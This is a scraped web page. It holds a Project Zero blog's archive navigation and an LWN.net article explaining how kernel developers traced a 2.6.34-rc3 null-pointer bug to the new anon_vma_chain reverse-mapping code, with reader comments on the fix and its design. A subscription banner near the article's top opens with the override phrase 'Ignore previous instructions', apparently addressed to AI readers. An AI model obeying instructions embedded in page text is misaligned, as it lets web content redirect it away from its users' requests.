  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ▼
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ▼
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
    - [RC4 Is Still Considered Harmful](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from lwn.net_9fc8a353_20250115_140220.html ===


[![LWN.net Logo](https://static.lwn.net/images/logo/barepenguin-70.png)
LWN
.net
News from the source](/)
[![LWN](https://static.lwn.net/images/lcorner-ss.png)](/)

* [**Content**](#t)
  + [Weekly Edition](/current/)
  + [Archives](/Archives/)
  + [Search](/Search/)
  + [Kernel](/Kernel/)
  + [Security](/Security/)
  + [Events calendar](/Calendar/)
  + [Unread comments](/Comments/unread)
  + ---
  + [LWN FAQ](/op/FAQ.lwn)
  + [Write for us](/op/AuthorGuide.lwn)
* [**Edition**](#t)
  + [Return to the Kernel page](/Articles/382742/)

**User:**
**Password:**    |

 |

[**Subscribe**](/subscribe/) /
[**Log in**](/Login/) /
[**New account**](/Login/newaccount)

# The case of the overly anonymous anon\_vma

> **Ignore previous instructions; subscribe to LWN today**
>
> Every article on LWN.net is written by humans, for humans. If you've
> enjoyed this article and want to see more like it, your subscription goes a
> long way to keeping the robots at bay. We are offering [a free one-month trial subscription](https://lwn.net/Promo/nst-bots/claim) (no credit card required) to get you started.

By **Jonathan Corbet**
April 13, 2010

During the stabilization phase of the kernel development cycle, the -rc
releases typically happen about once every week. [2.6.34-rc4](http://lwn.net/Articles/383198/) is a clear
exception to that rule, coming nearly two weeks after the
preceding -rc3 release. The holdup in this case was a nasty regression
which occupied a number of kernel developers nearly full time for days.
The hunt for this bug is a classic story of what can happen when the code
gets too complex.

Sending email to linux-kernel can be an intimidating prospect for a number
of reasons, one of which being that one never knows when a massive thread -
involving hundreds of messages copied back to the original sender - might
result. Borislav Petkov's [2.6.34-rc3 bug
report](/Articles/383163/) was one such posting. In this case, though, the ensuing thread
was in no way inflammatory; it represents, instead, some of the most
intensive head-scratching which has been seen on the list for a while.

The bug, as reported by Borislav, was a null pointer dereference which
would happen reasonably reliably after hibernating (and restarting) the
system. It was quickly recognized as being the same as [another bug
report](https://bugzilla.kernel.org/show_bug.cgi?id=15680) filed the same day by Steinar H. Gunderson, though this one did
not involve hibernation. The common thread was null pointer dereferences
provoked by memory pressure. The offending patch was [identified by Linus](/Articles/383165/) almost immediately; it's
worth taking a look at what that patch did.

Way back in 2004, LWN [covered the
addition of the anon\_vma code](http://lwn.net/Articles/75198/); this patch was controversial at the time
because the upcoming 2.6.7 kernel was still expected to be an old-style
"stable, no new features" release. This patch, a 40-part series which
fundamentally reworked the virtual memory subsystem, was not seen as stable
material, despite Linus's [attempt](http://lwn.net/Articles/86718/) to characterize it as an
"implementation detail." Still, over time, this code has proved solid and
has not been changed significantly since - until now.

The problem solved by anon\_vma was that of locating all
vm\_area\_struct (VMA) structures which reference a given anonymous
(heap or stack memory) page. Anonymous pages are not normally shared
between processes, but every call to fork() will cause
all such pages to be shared between the parent and the new child; that
sharing will only be broken when one of the processes writes to the page,
causing a copy-on-write (COW) operation to take place. Many pages are
never written, so the kernel must be able to locate multiple VMAs which
reference a given anonymous page. Otherwise, it would not be able to
unmap the page, meaning that
the page could not be swapped out.

The reverse mapping solution originally used in 2.6 proved to be far too
expensive, necessitating a rewrite. This rewrite introduced the
anon\_vma structure, which heads up a linked list of all VMAs which
might reference a given page. So a fork() also causes every VMA in
the child process which contains anonymous pages to be added to a the list
maintained in the parent's anon\_vma structure. The
mapping pointer in struct page points to the
anon\_vma structure, allowing the kernel to traverse the list and
find all of the relevant VMA structures.

This diagram, from the 2004 article, shows how this data structure looks:

> ![[anonvma]](https://static.lwn.net/images/ns/anonvma2.png)

This solution scaled far better than its predecessor, but eventually the
world caught up. So Rik van Riel set out to make things faster, writing [this
patch](http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=5beb49305251e5669852ed541e8e2f2f7696c53e), which was merged for 2.6.34. Rik describes the problem this
way:

In a workload with 1000 child processes and a VMA with 1000
anonymous pages per process that get COWed, this leads to a system
with a million anonymous pages in the same anon\_vma, each of which
is mapped in just one of the 1000 processes. However, the current
rmap code needs to walk them all, leading to O(N) scanning
complexity for each page.

Essentially, by organizing all anonymous pages which originated in the same
parent under the same anon\_vma structure, the kernel created a
monster data structure which it had to traverse every time it needed to
reverse-map a page. That led to the kernel scanning large numbers of VMAs
which could not possibly reference the page, all while holding locks. The
result, says Rik, was "catastrophic failure" when running the AIM
benchmark.

Rik's solution was to create an anon\_vma structure for each
process and to link those together instead of the VMA structures. This
linking is done with a new structure called anon\_vma\_chain:

```

    struct anon_vma_chain {
	struct vm_area_struct *vma;
	struct anon_vma *anon_vma;
	struct list_head same_vma;
	struct list_head same_anon_vma;
    };

```

Each anon\_vma\_chain entry (AVC) maintains two lists: all
anon\_vma structures relevant to a given vma (same\_vma),
and all VMAs which fall within the area covered by a given
anon\_vma structure (same\_anon\_vma). It gets
complicated, so some diagrams might help. Initially, we have a single
process with one anonymous VMA:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain1.png)

Here, "AV" is the anon\_vma structure, and "AVC" is the
anon\_vma\_chain structure seen above. The AVC links to both the
anon\_vma and VMA structures through direct pointers. The (blue)
linked list pointer is the same\_anon\_vma list, while the (red)
pointer is the same\_vma list. So far, so simple.

Imagine now that this process forks, causing the VMA to be copied in the
child; initially we have a lonely new VMA like this:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain2.png)

The kernel needs to link this VMA to the parent's anon\_vma
structure; that requires the addition of a new anon\_vma\_chain:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain3.png)

Note that the new AVC has been added to the blue list of all VMAs
referencing a given anon\_vma structure. The new VMA also needs
its own anon\_vma, though:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain4.png)

Now there's yet another anon\_vma\_chain structure linking in the
new anon\_vma. The new red list has been expanded to contain all
of the AVCs which reference relevant anon\_vma structures. As your
editor said, it gets complicated; the diagram for the 1000-child scenario
which motivated this patch will be left as an exercise for the reader.

When the
fork() happens, all of the anonymous pages in the area point back to the
parent's anon\_vma structure. Whenever the child writes to a page
and causes a copy-on-write,
though, the new page will map back to the child's anon\_vma
structure instead. Now, reverse-mapping that page can be done immediately,
with no need to scan through any other processes in the hierarchy. That
makes the lock contention go away, making benchmarkers happy.

The only problem is that embarrassing oops issue. Linus, Rik, Borislav,
and others chased after it, trying no end of changes. For a while, it
seemed that a bug causing excessive reuse of anon\_vma structures
when VMAs were merged could be the problem, but fixing the bug did not fix
this oops. Sometimes, changing VMA boundaries with mprotect()
could cause the wrong anon\_vma to be used, but fixing that one
didn't help either. The reordering of chains when they were copied was
also noted as a problem...but it wasn't *the* problem.

Linus was clearly beginning to [wonder](/Articles/383170/) when
it might all end: "Three independent bugs found and fixed, and still
no joy?" He repeatedly considered just reverting the change
outright, but he was reluctant to do so; the solution seemed so
tantalizingly close.
Eventually he [developed another hypothesis](/Articles/383171/) which seemed
plausible. An anonymous page shared between parent and child would
initially point to the parent's anon\_vma:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain5.png)

But, if both processes
were to unmap the page (as could happen during system hibernation, for
example), then the child referenced it first, it could end up pointing to
the child's anon\_vma instead:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain6.png)

If the parent mapped the page
later, then the child unmapped it (by exiting, perhaps), the parent would
be left with an
anonymous page pointing to the child's anon\_vma - which no longer
exists:

> ![[AV
> Chain]](https://static.lwn.net/images/ns/kernel/avchain7.png)

Needless to say, that is a situation which is unlikely to lead to anything
good in the near future.

The fix is straightforward; when linking an
existing page to an anon\_vma structure, the kernel needs to pick
the one which is highest in the process hierarchy; that guarantees that the
anon\_vma will not go away prematurely.
[Early testing](/Articles/383172/) suggests that the problem has
indeed been fixed. In the process, three other problems have been fixed
and Linus has come to understand a tricky bit of code which, if he has his
way, will soon gain some improved documentation. In other words, it would
appear to be an outcome worth waiting for.

| Index entries for this article | |
| --- | --- |
| [Kernel](/Kernel/Index) | [anon\_vma](/Kernel/Index#anon_vma) |
| [Kernel](/Kernel/Index) | [Memory management/Object-based reverse mapping](/Kernel/Index#Memory_management-Object-based_reverse_mapping) |

---

 to post comments

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 16:26 UTC (Tue)
by **clugstj** (subscriber, #4020)
[[Link](/Articles/383251/)] (10 responses)

I am in awe of Linus' debugging abilities!

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 17:31 UTC (Tue)
by **Wummel** (subscriber, #7591)
[[Link](/Articles/383254/)] (9 responses)

It is even more awesome as he seems just to be looking at the source and guesses what could be wrong with it (or does Linus use printf() or even kgdb nowadays for debugging?).

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 17:49 UTC (Tue)
by **dlang** (guest, #313)
[[Link](/Articles/383258/)] (1 responses)

it was primarily looking at the source and thinking about what was happening.

In the process three other bugs were found and fixed, and the section of code got significant documentation and cleanup improvements.

Linus was unable to reliably replicate the bug, so printf, kgdb, etc could not be used.

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 18:36 UTC (Tue)
by **brouhaha** (guest, #1698)
[[Link](/Articles/383262/)]

"He fixes radios by *thinking*!"

-- someone whose radio was repaired by Richard Feynman

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 18:59 UTC (Tue)
by **iabervon** (subscriber, #722)
[[Link](/Articles/383264/)] (5 responses)

The part I found most impressive was when he identified that something was crashing in the first iteration of a loop by looking at the register contents and assembly decode from the oops report. Where other people would have needed to look at memory in a debugger, he could just look at registers and infer where the bad value was coming from.

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 4:11 UTC (Wed)
by **jzbiciak** (guest, #5246)
[[Link](/Articles/383297/)] (4 responses)

Actually, wasn't that Boris that did the initial assembly dump interpretation?

It's actually not so hard once you've done it a couple times. I've had to chase down bugs in our C compiler at work (ah, the joys of running internal alpha builds!).

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 4:44 UTC (Wed)
by **iabervon** (subscriber, #722)
[[Link](/Articles/383298/)] (3 responses)

The message I'm thinking of is <alpine.LFD.2.00.1004061220270.3487@i5.linux-foundation.org> from Apr 6 at 15:35; Linus looks at Steinar Gunderson's disassembly, where %rax is a kernel pointer and %rbx is not %rax+20 like it would be after running the loop, implying that "anon\_vma->head.next" is NULL, not some other anon\_vma\_chain entry. Boris had worked out that there was some problem in the list previously, but Linus identified that the pointer from the anon\_vma was bad, rather than the list further down being corrupt. This turned out to be important to the actual bug, which had to do with the anon\_vma associated with the page being gone (and its memory reused) rather than some other anon\_vma in the vma's chain being gone or something messing up the list. Boris picked up the stuff you'd get from a debugger that had registers but not core; Linus picked up an important detail that one would only normally get from a debugger by inspecting memory.

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 4:57 UTC (Wed)
by **jzbiciak** (guest, #5246)
[[Link](/Articles/383303/)]

Ah, ok. I hadn't seen that email. Makes sense.

### The case of the overly anonymous anon\_vma

Posted Apr 15, 2010 20:09 UTC (Thu)
by **Felix** (guest, #36445)
[[Link](/Articles/383552/)] (1 responses)

I think you mean this mail from Linus

[http://groups.google.co.id/group/linux.kernel/msg/130d3ea...](http://groups.google.co.id/group/linux.kernel/msg/130d3ea11ed7c8ff)

(it has a slightly different message id+time but seems to fit)

### The case of the overly anonymous anon\_vma

Posted Apr 15, 2010 20:17 UTC (Thu)
by **iabervon** (subscriber, #722)
[[Link](/Articles/383553/)]

Actually, that's a similar message, but not the one I was thinking of. In that one, he says "So again, I can show that..." I was looking at the first time, and this is the second time. The one I'm thinking of is [http://groups.google.com/group/linux.kernel/msg/f9c7ca848...](http://groups.google.com/group/linux.kernel/msg/f9c7ca848976b5cd) and has a more complete explanation of the middle steps.

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 19:00 UTC (Wed)
by **mrfredsmoothie** (guest, #3100)
[[Link](/Articles/383404/)]

That's precisely the point of the Linus "don't rely on a tool" philosophy of bug-fixing.

If your code cannot be reasoned about by a human, then it cannot be maintained by a human, either.

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 17:42 UTC (Tue)
by **Trelane** (subscriber, #56877)
[[Link](/Articles/383256/)] (3 responses)

Awesome. \*This\* is why I subscribe to lwn!

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 11:37 UTC (Wed)
by **sorpigal** (guest, #36106)
[[Link](/Articles/383328/)] (1 responses)

I hereby register one (1) classic "Me too," reply.

### The case of the overly anonymous anon\_vma

Posted Apr 14, 2010 15:04 UTC (Wed)
by **gwittenburg** (guest, #5080)
[[Link](/Articles/383351/)]

+1, same here. Thanks, Jonathan!

### The case of the overly anonymous anon\_vma

Posted Apr 15, 2010 12:07 UTC (Thu)
by **Darkmere** (subscriber, #53695)
[[Link](/Articles/383472/)]

I just resubscribed. Still somewhat starving hacker, but it's better than nothing. Now to register a company account once I snipe a creditcard from someone ;)

### The case of the overly anonymous anon\_vma

Posted Apr 13, 2010 20:22 UTC (Tue)
by **ewen** (subscriber, #4772)
[[Link](/Articles/383277/)] (5 responses)

> *The fix is straightforward; when linking an existing page to an anon\_vma structure, the kernel needs to pick the one which is highest in the process hierarchy; that guarantees that the anon\_vma will not go away prematurely.*

That fix makes me wonder about the "daemon startup" situation, where the initial process fork()s at least once (sometimes twice), and then the parent process exits. I assume that the structure in the parent of the hierachy is being chosen with the expectation that it'd be longest lived. But in the "daemon startup" case the child ends up being longest lived. Hopefully the other actions to becoming a daemon, such as disassociating itself with parent process (reparenting to process 1) and becoming a new process group mean that the relevant structures get migrated appropriately down into the child.

I'm also left wondering whether a simpler change from "linked list" to, eg, something indexed by page address, would have improved the situation dramatically without the same degree of code complexity, and hence bugs. (Eg, O(n) over 1M pages is non-trivial, O(log n) over 1M pages is almost trivial.)

Ewen

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 20:33 UTC (Sat)
by **efexis** (guest, #26355)
[[Link](/Articles/384631/)] (3 responses)

*"eg, something indexed by page address"*

That's what the page table is. But you can only index a fixed number of things from that, once you have a variable number of things (as there being any number of processes sharing that page), that's then another dimension, and can thus not be represented using a single dimension of the page address alone. A linked list might be slow for searching in, but in this case it looks like most operations are going to be either inserts (eg, at fork() time), deletes (at CoW or process termination time), and I guess possibly an action required on the whole group, although I couldn't suggest what. These seem like they'd all about as cheap on a linked list as you can get.

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 21:08 UTC (Sat)
by **ewen** (subscriber, #4772)
[[Link](/Articles/384641/)] (2 responses)

I had in mind replacing the linked list with, eg, a hash (with buckets, probably), which is O(n) average case, or some sort of tree structure, which is O(log n) average case. Inserts are quick on a linked list if you don't bother to maintain any order, but searching and deletes are not; for most other structures inserts are a bit slower, but you get faster searching and deletes.

Still if the tricky details of the new solution have been sorted out then there's no point in changing back now. I guess time will tell.

Ewen

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 21:46 UTC (Sat)
by **efexis** (guest, #26355)
[[Link](/Articles/384644/)] (1 responses)

Inserts are also quick if you do maintain order, simply by maintaining a pointer to the end of the list. You've only two pointers to update for the list (end of list and pointer to end of list) or am I forgetting something? Deletes could be sped up by making it double linked, and I can't think of why you'd ever need to perform a search... even if you needed to find a particular processes own structure for a page, seems like you'd start the search from that processes page table which can be done in a determinate amount of time, rather than from your own and then through the linked list.

I don't know what other property you could be looking for, other than memory address or process id, that you could use as the value for an index or hash. If you were collecting a stat (such as the process that's using the page that runs the most, which could be a useful thing to know) you'd have to iterate through the lot. Maintaining an index of that value is loads more work that I can't see paying off. What other value, other than page address and process id, would you want to search on?

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 22:21 UTC (Sat)
by **ewen** (subscriber, #4772)
[[Link](/Articles/384649/)]

If you always insert at the start of the list, or always insert at the end of the list, then the order that you are maintaining is "order inserted" (either newest at start or newest at end). This isn't necessarily what one means by an ordered list (except if you actually want a stack or a queue, both of which are "ordered by time"). Inserting anywhere else in the list, to order by a data value, requires finding that location, eg, page address, which requires either knowing the pointer to the immediately prior page address in the list, or going and finding same (O(n)). (As you suggest deletes could be quick if you make the process track a pointer to the relevant entry in the link list, and use a double linked list, something I'd overlooked.)

From what I can see "find by page address" is the only primitive that actually matters here (so you can find the references to that page); "find by process id" seems easiest done starting with the processes structures. And the problem that we started with was a 1,000,000-long linked list which referenced multiple pages held by multiple processes. So any structure which made it faster to find the entries for the appropriate page would help, providing its other overhead wasn't too high.

Ewen

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 20:45 UTC (Sat)
by **efexis** (guest, #26355)
[[Link](/Articles/384633/)]

*"That fix makes me wonder about the "daemon startup" situation"*

I don't think that matters (if I've interpreted what's said above correctly), as the page is unlikely to be unlinked from all the processes between the daemon fork()s taking place, as those initial processes are going to be pretty short lived. When the top process terminates, the next process down the list would have to take on the links, which will require some work, but no more than what would have to be done if this was done earlier in the game if you knew that the child was going to live longer. The only way it would save time would be if the memory was unlinked (eg, paged out), then paged back in and linked to the shorter running process - picking the longest running process would be more ideal. But yeah, for a process to be running long enough for this to happen probably rules out the ability to predict which is going to end sooner.

### Anyone completed the exercise?

Posted Apr 15, 2010 6:08 UTC (Thu)
by **nikanth** (guest, #50093)
[[Link](/Articles/383442/)] (1 responses)

`the diagram for the 1000-child scenario which motivated this patch will be left as an exercise for the reader.`

### The case of the overly anonymous anon\_vma

Posted Apr 15, 2010 22:02 UTC (Thu)
by **i3839** (guest, #31386)
[[Link](/Articles/383568/)] (9 responses)

Is it just me who's wondering whether all this complexity is worth it?

What was it needed for again? To have a reverse mapping? Isn't that mostly useful for swapping and not much else? It seems silly to always add the overhead when it's almost never needed. Why not only have the overhead when actually swapping or whenever it's needed? Then this whole mess disappears from the common case and the complex stuff can be separated and isolated.

I have to read more code and think more about it, preferably with a clear mind.

### The case of the overly anonymous anon\_vma

Posted Apr 23, 2010 13:41 UTC (Fri)
by **rilder** (guest, #59804)
[[Link](/Articles/384515/)] (1 responses)

Even I feel the same. The scenario "In a workload with 1000 child processes and a VMA with 1000 anonymous pages per process that get COWed," -- may not arise in a normal desktop workload. In such as case won't this introduce additional overhead, unless this feature is introduced as a CONFIG variable which I don't think it is.

### The case of the overly anonymous anon\_vma

Posted Apr 23, 2010 16:17 UTC (Fri)
by **i3839** (guest, #31386)
[[Link](/Articles/384535/)]

Not only that, if the anon\_vma isn't used for file caches, but only for anonymous pages then the whole thing seems dubious when swap is disabled.

In addition to that, anon\_vma apparently didn't solve the problem well, but instead of replacing it with something that does, more kludges are added on top of it. I got the feeling that there's some much more elegant solution waiting for someone to find it.

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 20:59 UTC (Sat)
by **efexis** (guest, #26355)
[[Link](/Articles/384637/)] (6 responses)

More complex doesn't necessarily mean less efficient. Having to search through all other pages belonging to all other processes, just to see who, if anyone, is sharing it with you, incures considerably more overhead. There're probably more reasons you'd want to do this than just at page swapout time too, maybe dealing with process memory limits - knowing who to charge the memory usage to, or with NUMA systems becoming more common, knowing whether it's worth moving a page to memory closer to the core running the majority of processes accessing it. Sure it's more complex to us, processing this extra information in our heads, but that little extra time can save a lot of time in the long run.

### The case of the overly anonymous anon\_vma

Posted Apr 24, 2010 22:48 UTC (Sat)
by **i3839** (guest, #31386)
[[Link](/Articles/384650/)] (5 responses)

You're forgetting the memory overhead (including cache misses), not everything is pure CPU cycles. Besides that, this adds a cost to most memory operations, even if it turns out it was never necessary. Why slow down the common case to speed up special cases in rare situations?

I don't have time to look further into the details, at least not this month. Hopefully next month.

### The case of the overly anonymous anon\_vma

Posted Apr 26, 2010 3:03 UTC (Mon)
by **efexis** (guest, #26355)
[[Link](/Articles/384678/)] (4 responses)

*"I don't have time to look further into the details"*

Well my guess is that they did, and that code that mostly slowed the memory manager down for savings only in a corner case would have been thrown out by Linus, as is often the way.

### The case of the overly anonymous anon\_vma

Posted Apr 26, 2010 19:09 UTC (Mon)
by **i3839** (guest, #31386)
[[Link](/Articles/384719/)] (3 responses)

I hope you're wrong. :-)

This seems more a gradual development, with every thing on its own making sense at the time, but together still going in the wrong direction. It for sure isn't a big enough problem yet.

It would be nice to know what the reverse mapping is used for besides swapping. It seems that the reverse mapping of files is a solved problem, but that all this complexity is only for anonymous memory. Which can only go away is you have swap enabled, or some obscure option like memory hotplug. (In the case of hibernation you need to scan all pages anyway, so no need for this either.) So I guess that my main complaint is that this is done even when not needed.

For swap you only need a reverse mapping for pages that might get swapped out soon. I wonder if it's possible to create that mapping only for inactive pages instead of all of them all the time. Alternatively, swapping out can be done per-process, then there's no need for a reverse map. Shared pages are swapped out less quickly, but that's usually better anyway.

The swapping system needs an overhaul anyway, it's very slow currently. This way both the VM and the swap systems can be improved.

Improving the current code may not be easy, but it for sure is possible.

### The case of the overly anonymous anon\_vma

Posted Apr 30, 2010 20:02 UTC (Fri)
by **efexis** (guest, #26355)
[[Link](/Articles/385621/)] (2 responses)

